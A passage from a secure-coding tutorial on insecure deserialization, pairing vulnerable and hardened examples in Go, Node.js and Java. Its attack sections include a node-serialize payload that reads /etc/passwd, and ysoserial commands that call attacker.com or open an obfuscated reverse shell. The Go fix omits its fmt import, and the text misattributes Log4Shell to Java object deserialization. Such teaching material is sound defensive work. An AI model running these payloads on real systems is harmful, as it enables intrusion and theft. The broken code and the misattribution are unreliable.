**Why This Is Dangerous**:
- Arbitrary command execution from untrusted JSON data
- No validation of deserialized content before use
- Error handling ignored, hiding attack indicators
- No allowlist for acceptable commands or plugins

**SECURE VERSION**:

```go
package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"regexp"
)

var (
	// Allowlist of valid plugin names
	allowedPlugins = map[string]bool{
		"health-check": true,
		"metrics":      true,
		"backup":       true,
	}
	// Validation pattern for plugin names
	pluginNamePattern = regexp.MustCompile(`^[a-z][a-z0-9-]{2,30}$`)
	// HMAC secret for signature verification
	hmacSecret = []byte("your-secret-key-from-env")
)

// SafePluginConfig with validation tags
type SafePluginConfig struct {
	Plugins   []SafePlugin `json:"plugins"`
	Signature string       `json:"signature"`
	Timestamp int64        `json:"timestamp"`
}

type SafePlugin struct {
	Name   string `json:"name"`
	Enable bool   `json:"enable"`
}

func verifySignature(data []byte, signature string) bool {
	mac := hmac.New(sha256.New, hmacSecret)
	mac.Write(data)
	expectedMAC := mac.Sum(nil)
	providedMAC, err := hex.DecodeString(signature)
	if err != nil {
		return false
	}
	return hmac.Equal(expectedMAC, providedMAC)
}

func validatePlugin(plugin SafePlugin) error {
	if !pluginNamePattern.MatchString(plugin.Name) {
		return fmt.Errorf("invalid plugin name format: %s", plugin.Name)
	}
	if !allowedPlugins[plugin.Name] {
		return fmt.Errorf("plugin not in allowlist: %s", plugin.Name)
	}
	return nil
}

func loadPluginsSafe(w http.ResponseWriter, r *http.Request) {
	// Limit request body size
	r.Body = http.MaxBytesReader(w, r.Body, 1024*10) // 10KB max

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("Error reading body: %v", err)
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var config SafePluginConfig
	if err := json.Unmarshal(body, &config); err != nil {
		log.Printf("JSON parse error: %v", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Validate each plugin against allowlist
	for _, plugin := range config.Plugins {
		if err := validatePlugin(plugin); err != nil {
			log.Printf("Plugin validation failed: %v", err)
			http.Error(w, "Invalid plugin configuration", http.StatusForbidden)
			return
		}
	}

	log.Printf("Successfully loaded %d plugins", len(config.Plugins))
	w.WriteHeader(http.StatusOK)
}
```

**Key Security Controls**:
- **Allowlist validation**: Only pre-approved plugins can be loaded, preventing arbitrary code execution
- **Input size limits**: MaxBytesReader prevents denial of service from large payloads
- **Strict type definitions**: No interfaces or dynamic types that could be exploited
- **Comprehensive error handling**: All errors logged and handled securely

When accepting configuration from external sources like message queues, you need cryptographic integrity verification, schema validation, and multiple defense layers. Here's a production-ready pattern:

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"regexp"
	"sync"
	"time"
)

// ConfigVersion tracks configuration changes
type ConfigVersion struct {
	Version   int64  `json:"version"`
	Hash      string `json:"hash"`
	Timestamp int64  `json:"timestamp"`
}

// SignedConfigMessage from external source
type SignedConfigMessage struct {
	Payload   json.RawMessage `json:"payload"`
	Signature string          `json:"signature"`
	KeyID     string          `json:"key_id"`
	Algorithm string          `json:"algorithm"`
	Version   ConfigVersion   `json:"version"`
}

// ApplicationConfig is the validated configuration
type ApplicationConfig struct {
	DatabasePool    int      `json:"database_pool"`
	CacheEnabled    bool     `json:"cache_enabled"`
	AllowedOrigins  []string `json:"allowed_origins"`
	MaxRequestSize  int64    `json:"max_request_size"`
	FeatureFlags    map[string]bool `json:"feature_flags"`
}

// ConfigValidator validates and verifies configuration
type ConfigValidator struct {
	publicKeys      map[string]ed25519.PublicKey
	allowedOriginRe *regexp.Regexp
	lastVersion     int64
	mu              sync.RWMutex
	auditLog        *log.Logger
}

func NewConfigValidator(auditLog *log.Logger) *ConfigValidator {
	return &ConfigValidator{
		publicKeys:      make(map[string]ed25519.PublicKey),
		allowedOriginRe: regexp.MustCompile(`^https://[a-z0-9][a-z0-9.-]*\.[a-z]{2,}$`),
		auditLog:        auditLog,
	}
}

// RegisterPublicKey adds a trusted signing key
func (cv *ConfigValidator) RegisterPublicKey(keyID string, pubKey ed25519.PublicKey) {
	cv.mu.Lock()
	defer cv.mu.Unlock()
	cv.publicKeys[keyID] = pubKey
	cv.auditLog.Printf("Registered public key: %s", keyID)
}

// VerifySignature cryptographically verifies message integrity
func (cv *ConfigValidator) VerifySignature(msg *SignedConfigMessage) error {
	cv.mu.RLock()
	pubKey, exists := cv.publicKeys[msg.KeyID]
	cv.mu.RUnlock()

	if !exists {
		return fmt.Errorf("unknown signing key: %s", msg.KeyID)
	}

	if msg.Algorithm != "ed25519" {
		return fmt.Errorf("unsupported algorithm: %s", msg.Algorithm)
	}

	signature, err := base64.StdEncoding.DecodeString(msg.Signature)
	if err != nil {
		return fmt.Errorf("invalid signature encoding: %w", err)
	}

	// Verify signature over payload
	if !ed25519.Verify(pubKey, msg.Payload, signature) {
		cv.auditLog.Printf("SECURITY: Signature verification failed for key %s", msg.KeyID)
		return errors.New("signature verification failed")
	}

	return nil
}

// ValidateVersion prevents replay attacks
func (cv *ConfigValidator) ValidateVersion(version ConfigVersion) error {
	cv.mu.RLock()
	lastVer := cv.lastVersion
	cv.mu.RUnlock()

	if version.Version <= lastVer {
		return fmt.Errorf("version %d is not newer than %d (replay attack?)", 
			version.Version, lastVer)
	}

	// Verify timestamp is recent (within 5 minutes)
	now := time.Now().Unix()
	if version.Timestamp < now-300 || version.Timestamp > now+60 {
		return fmt.Errorf("timestamp %d is outside acceptable window", version.Timestamp)
	}

	return nil
}

// ValidatePayloadHash ensures payload integrity
func (cv *ConfigValidator) ValidatePayloadHash(payload json.RawMessage, expectedHash string) error {
	hash := sha256.Sum256(payload)
	actualHash := hex.EncodeToString(hash[:])

	if actualHash != expectedHash {
		return errors.New("payload hash mismatch")
	}
	return nil
}

// ValidateConfigValues enforces business rules
func (cv *ConfigValidator) ValidateConfigValues(config *ApplicationConfig) error {
	// Validate numeric ranges
	if config.DatabasePool < 1 || config.DatabasePool > 100 {
		return fmt.Errorf("database_pool must be 1-100, got %d", config.DatabasePool)
	}

	if config.MaxRequestSize < 1024 || config.MaxRequestSize > 10*1024*1024 {
		return fmt.Errorf("max_request_size must be 1KB-10MB, got %d", config.MaxRequestSize)
	}

	// Validate allowed origins format
	for _, origin := range config.AllowedOrigins {
		if !cv.allowedOriginRe.MatchString(origin) {
			return fmt.Errorf("invalid origin format: %s", origin)
		}
	}

	// Limit array sizes to prevent resource exhaustion
	if len(config.AllowedOrigins) > 50 {
		return errors.New("too many allowed_origins (max 50)")
	}

	if len(config.FeatureFlags) > 100 {
		return errors.New("too many feature_flags (max 100)")
	}

	return nil
}

// ProcessConfigMessage is the main entry point
func (cv *ConfigValidator) ProcessConfigMessage(ctx context.Context, rawMsg []byte) (*ApplicationConfig, error) {
	// Parse outer message structure
	var signedMsg SignedConfigMessage
	if err := json.Unmarshal(rawMsg, &signedMsg); err != nil {
		cv.auditLog.Printf("Failed to parse signed message: %v", err)
		return nil, fmt.Errorf("invalid message format: %w", err)
	}

	// LAYER 1: Verify cryptographic signature
	if err := cv.VerifySignature(&signedMsg); err != nil {
		return nil, fmt.Errorf("signature verification: %w", err)
	}

	// LAYER 2: Validate version (anti-replay)
	if err := cv.ValidateVersion(signedMsg.Version); err != nil {
		cv.auditLog.Printf("Version validation failed: %v", err)
		return nil, fmt.Errorf("version validation: %w", err)
	}

	// LAYER 3: Verify payload hash
	if err := cv.ValidatePayloadHash(signedMsg.Payload, signedMsg.Version.Hash); err != nil {
		return nil, fmt.Errorf("hash validation: %w", err)
	}

	// LAYER 4: Parse and validate configuration values
	var config ApplicationConfig
	if err := json.Unmarshal(signedMsg.Payload, &config); err != nil {
		return nil, fmt.Errorf("config parse error: %w", err)
	}

	// LAYER 5: Business rule validation
	if err := cv.ValidateConfigValues(&config); err != nil {
		cv.auditLog.Printf("Config validation failed: %v", err)
		return nil, fmt.Errorf("config validation: %w", err)
	}

	// Update version tracker
	cv.mu.Lock()
	cv.lastVersion = signedMsg.Version.Version
	cv.mu.Unlock()

	cv.auditLog.Printf("Successfully processed config version %d from key %s",
		signedMsg.Version.Version, signedMsg.KeyID)

	return &config, nil
}
```

**Defense in Depth Layers**:

1. **Cryptographic Signature Verification (Ed25519)**:
```go
// Only accept messages signed by trusted keys
if !ed25519.Verify(pubKey, msg.Payload, signature) {
    return errors.New("signature verification failed")
}
```

2. **Anti-Replay Protection**:
```go
// Monotonically increasing version numbers
if version.Version <= lastVer {
    return fmt.Errorf("replay attack detected")
}
// Time-based validation (5-minute window)
if version.Timestamp < now-300 {
    return fmt.Errorf("message too old")
}
```

3. **Schema and Value Validation**:
```go
// Strict type definitions - no interfaces
type ApplicationConfig struct {
    DatabasePool int `json:"database_pool"` // Concrete types only
}
// Range validation
if config.DatabasePool < 1 || config.DatabasePool > 100 {
    return errors.New("out of range")
}
```

**Additional Protections**:
- **Key rotation support**: Multiple keys can be registered with unique IDs for seamless rotation
- **Comprehensive audit logging**: All validation successes and failures are logged for security monitoring
- **Resource limits**: Array sizes and numeric ranges are bounded to prevent DoS
- **Immutable configuration pattern**: Return new config structs rather than modifying shared state
- **Context propagation**: Support for cancellation and timeouts via context
- **Thread-safe design**: Mutex protection for shared state access

Deserializing untrusted data is extremely dangerous and has led to numerous critical vulnerabilities including remote code execution. The node-serialize package vulnerability (CVE-2017-5941) demonstrated how serialized JavaScript objects can contain executable code.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

app.get('/profile', (req, res) => {
  // DANGEROUS: Deserializing untrusted cookie data
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // This is vulnerable to RCE!
    const sessionData = serialize.unserialize(
      Buffer.from(sessionCookie, 'base64').toString()
    );

    res.json({
      username: sessionData.username,
      role: sessionData.role,
      lastLogin: sessionData.lastLogin
    });
  } else {
    res.status(401).json({ error: 'No session' });
  }
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE (Immediately Invoked Function Expression)
const maliciousPayload = {
  rce: function() {
    require('child_process').execSync('cat /etc/passwd > /tmp/pwned');
  }()
};

// Serialized form that executes on unserialize:
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('cat /etc/passwd > /tmp/pwned')}()"}
```

**Why This Is Dangerous**:
- `node-serialize.unserialize()` can execute arbitrary JavaScript functions embedded in the serialized data
- Attacker controls the cookie content completely
- IIFE notation `()` causes immediate execution upon deserialization
- No integrity verification of the data source

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const Joi = require('joi');

const app = express();
app.use(cookieParser());

// Use environment variable for secret
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be set and at least 32 characters');
}

// Define strict schema for session data
const sessionSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  role: Joi.string().valid('user', 'admin', 'moderator').required(),
  lastLogin: Joi.date().iso().required(),
  userId: Joi.string().uuid().required()
});

app.get('/profile', (req, res) => {
  const sessionToken = req.cookies.session;

  if (!sessionToken) {
    return res.status(401).json({ error: 'No session' });
  }

  try {
    // SECURE: Use JWT with signature verification
    const decoded = jwt.verify(sessionToken, JWT_SECRET, {
      algorithms: ['HS256'],  // Explicitly specify allowed algorithms
      maxAge: '1h'            // Token expiration
    });

    // SECURE: Validate decoded data against schema
    const { error, value } = sessionSchema.validate(decoded);
    if (error) {
      console.warn('Invalid session data structure:', error.message);
      return res.status(400).json({ error: 'Invalid session format' });
    }

    res.json({
      username: value.username,
      role: value.role,
      lastLogin: value.lastLogin
    });
  } catch (err) {
    console.error('Session verification failed:', err.message);
    res.status(401).json({ error: 'Invalid session' });
  }
});

app.listen(3000);
```

**Key Security Controls**:
- **JWT with cryptographic signature**: Data integrity verified before use, preventing tampering
- **Schema validation with Joi**: Even after signature verification, validate data structure and types
- **Explicit algorithm specification**: Prevents algorithm confusion attacks (e.g., `none` algorithm)

When handling complex objects from external sources, you need a defense-in-depth approach with strict type checking, schema validation, and safe reconstruction patterns. Never use `eval()`, `Function()`, or libraries that can execute code during parsing.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const crypto = require('crypto');
const winston = require('winston');

const app = express();
app.use(express.json({ limit: '100kb' })); // Limit payload size

// Configure structured logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [new winston.transports.Console()]
});

// Initialize JSON Schema validator
const ajv = new Ajv({ allErrors: true, removeAdditional: true });
addFormats(ajv);

// Define strict schema for external API data
const externalOrderSchema = {
  type: 'object',
  additionalProperties: false,
  required: ['orderId', 'customer', 'items', 'total'],
  properties: {
    orderId: { type: 'string', pattern: '^[A-Z0-9]{8,16}$' },
    customer: {
      type: 'object',
      additionalProperties: false,
      required: ['id', 'email'],
      properties: {
        id: { type: 'string', format: 'uuid' },
        email: { type: 'string', format: 'email', maxLength: 254 },
        name: { type: 'string', maxLength: 100 }
      }
    },
    items: {
      type: 'array',
      minItems: 1,
      maxItems: 100,
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['sku', 'quantity', 'price'],
        properties: {
          sku: { type: 'string', pattern: '^[A-Z0-9-]{5,20}$' },
          quantity: { type: 'integer', minimum: 1, maximum: 1000 },
          price: { type: 'number', minimum: 0, maximum: 999999.99 }
        }
      }
    },
    total: { type: 'number', minimum: 0 },
    metadata: {
      type: 'object',
      additionalProperties: false,
      properties: {
        source: { type: 'string', enum: ['web', 'mobile', 'api'] },
        timestamp: { type: 'string', format: 'date-time' }
      }
    }
  }
};

const validateOrder = ajv.compile(externalOrderSchema);

// Safe deserialization class with reconstruction
class SafeDeserializer {
  constructor(schema, validator) {
    this.schema = schema;
    this.validator = validator;
  }

  // Parse with multiple safety layers
  parse(rawData, source) {
    const requestId = crypto.randomUUID();

    // Layer 1: Type check
    if (typeof rawData !== 'string') {
      logger.warn({ requestId, source, error: 'Input is not a string' });
      throw new DeserializationError('Invalid input type');
    }

    // Layer 2: Size limit
    if (rawData.length > 102400) { // 100KB
      logger.warn({ requestId, source, error: 'Payload too large', size: rawData.length });
      throw new DeserializationError('Payload exceeds size limit');
    }

    // Layer 3: Safe JSON parsing (no code execution)
    let parsed;
    try {
      parsed = JSON.parse(rawData);
    } catch (e) {
      logger.warn({ requestId, source, error: 'JSON parse failed' });
      throw new DeserializationError('Invalid JSON');
    }

    // Layer 4: Prototype pollution prevention
    if (this.hasPrototypePollution(parsed)) {
      logger.error({ requestId, source, error: 'Prototype pollution attempt detected' });
      throw new DeserializationError('Invalid object structure');
    }

    // Layer 5: Schema validation
    if (!this.validator(parsed)) {
      logger.warn({
        requestId,
        source,
        error: 'Schema validation failed',
        details: this.validator.errors
      });
      throw new DeserializationError('Data does not match expected schema');
    }

    // Layer 6: Safe reconstruction (creates clean object)
    const safeObject = this.reconstruct(parsed);

    logger.info({ requestId, source, status: 'deserialization_success' });
    return safeObject;
  }

  // Check for prototype pollution attempts
  hasPrototypePollution(obj, depth = 0) {
    if (depth > 10) return true; // Prevent deep recursion
    if (obj === null || typeof obj !== 'object') return false;

    const dangerous = ['__proto__', 'constructor', 'prototype'];

    for (const key of Object.keys(obj)) {
      if (dangerous.includes(key)) return true;
      if (typeof obj[key] === 'object' && obj[key] !== null) {
        if (this.hasPrototypePollution(obj[key], depth + 1)) return true;
      }
    }
    return false;
  }

  // Reconstruct object without prototype chain pollution
  reconstruct(data) {
    return JSON.parse(JSON.stringify(data));
  }
}

class DeserializationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'DeserializationError';
    this.statusCode = 400;
  }
}

// Create deserializer instance
const orderDeserializer = new SafeDeserializer(externalOrderSchema, validateOrder);

// API endpoint receiving external data
app.post('/api/orders/webhook', async (req, res) => {
  const requestId = crypto.randomUUID();

  try {
    // Verify webhook signature (HMAC)
    const signature = req.headers['x-webhook-signature'];
    const payload = JSON.stringify(req.body);

    const expectedSignature = crypto
      .createHmac('sha256', process.env.WEBHOOK_SECRET)
      .update(payload)
      .digest('hex');

    if (!crypto.timingSafeEqual(
      Buffer.from(signature || ''),
      Buffer.from(expectedSignature)
    )) {
      logger.warn({ requestId, error: 'Invalid webhook signature' });
      return res.status(401).json({ error: 'Invalid signature' });
    }

    // Safe deserialization with all protections
    const order = orderDeserializer.parse(
      JSON.stringify(req.body),
      'external_webhook'
    );

    // Process the safely deserialized order
    logger.info({ requestId, orderId: order.orderId, status: 'processing' });

    res.json({ success: true, orderId: order.orderId });
  } catch (err) {
    if (err instanceof DeserializationError) {
      return res.status(400).json({ error: err.message });
    }
    logger.error({ requestId, error: err.message });
    res.status(500).json({ error: 'Internal error' });
  }
});

app.listen(3000);
```

**Defense in Depth Layers**:

1. **HMAC Signature Verification**: Verify external data authenticity before processing
```javascript
const expectedSig = crypto.createHmac('sha256', secret).update(payload).digest('hex');
crypto.timingSafeEqual(Buffer.from(received), Buffer.from(expectedSig));
```

2. **Prototype Pollution Prevention**: Block `__proto__`, `constructor`, `prototype` keys
```javascript
const dangerous = ['__proto__', 'constructor', 'prototype'];
if (dangerous.includes(key)) throw new Error('Blocked');
```

3. **JSON Schema Validation with AJV**: Strict type enforcement with `additionalProperties: false`
```javascript
const ajv = new Ajv({ removeAdditional: true });
const validate = ajv.compile(strictSchema);
```

**Additional Protections**:
- **Payload size limits**: Prevent DoS via large payloads (100KB max)
- **Timing-safe comparison**: Prevent timing attacks on signature verification
- **Structured logging**: Audit trail for all deserialization attempts
- **Safe reconstruction**: `JSON.parse(JSON.stringify())` creates clean object without prototype chain
- **Request ID tracking**: Correlate logs for incident investigation

Reading serialized Java objects directly from files is extremely dangerous - this is one of the most critical vulnerability classes in Java security, responsible for breaches like the Log4Shell incident that affected millions of systems.

**VULNERABLE CODE**:

```java
import java.io.*;

public class PreferencesLoader {

    public UserPreferences loadPreferences(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ObjectInputStream ois = new ObjectInputStream(fis);

        // VULNERABLE: Deserializes ANY object without validation
        UserPreferences prefs = (UserPreferences) ois.readObject();

        ois.close();
        return prefs;
    }

    // Also vulnerable: accepting serialized data from network
    public Object receiveObject(InputStream networkStream) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(networkStream);
        return ois.readObject();  // RCE waiting to happen
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized payload using Commons Collections gadget chain
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > malicious.ser

# Or execute reverse shell
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' > shell.ser
```

**Why This Is Dangerous**:
- `ObjectInputStream.readObject()` instantiates objects and executes code during deserialization
- Attacker-controlled data can trigger "gadget chains" using classes in the classpath
- Code execution happens BEFORE the type cast, so checking types afterward is useless
- Common libraries like Apache Commons Collections, Spring, Jackson contain exploitable gadgets

**SECURE VERSION**:

```java
import java.io.*;
import java.util.Set;
import java.util.HashSet;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecurePreferencesLoader {
    private static final Logger logger = LoggerFactory.getLogger(SecurePreferencesLoader.class);

    // Whitelist of allowed classes for deserialization
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.model.UserPreferences",
        "java.lang.String",
        "java.lang.Integer",
        "java.util.HashMap",
        "java.util.ArrayList"
    );

    public UserPreferences loadPreferences(String filename) throws Exception {
        try (FileInputStream fis = new FileInputStream(filename);
             ValidatingObjectInputStream ois = new ValidatingObjectInputStream(fis)) {

            Object obj = ois.readObject();

            if (!(obj instanceof UserPreferences)) {
                logger.warn("Unexpected object type: {}", obj.getClass().getName());
                throw new SecurityException("Invalid preferences object");
            }

            return (UserPreferences) obj;
        }
    }

    // Custom ObjectInputStream that validates classes before deserializing
    private static class ValidatingObjectInputStream extends ObjectInputStream {

        public ValidatingObjectInputStream(InputStream in) throws IOException {
            super(in);
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) 
                throws IOException, ClassNotFoundException {
            String className = desc.getName();

            // Block dangerous classes before they're instantiated
            if (!ALLOWED_CLASSES.contains(className) && !className.startsWith("[")) {
                logger.error("Blocked deserialization of unauthorized class: {}", className);
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }

            return super.resolveClass(desc);
        }
    }
}
```

**Key Security Controls**:
- **Class Whitelist Filtering**: Only allow specific, known-safe classes to be deserialized by overriding `resolveClass()`
- **Validation Before Instantiation**: Block dangerous classes BEFORE `readObject()` creates instances and triggers gadget chains
- **Type Validation**: Explicitly verify the deserialized object type matches expectations

